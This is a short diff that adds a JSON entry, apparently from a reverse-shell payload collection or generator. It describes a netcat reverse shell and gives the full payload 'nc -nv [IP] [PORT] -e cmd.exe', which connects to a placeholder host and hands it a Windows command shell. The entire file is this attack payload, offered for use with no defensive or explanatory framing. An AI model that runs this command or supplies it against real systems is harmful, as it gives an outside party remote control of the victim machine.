@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "uses netcat to start a reverse shell",
+      "type": "reverse",
+      "exec": "batch"
+    },
+    "payload": "nc -nv [IP] [PORT] -e cmd.exe"
+  }
+}
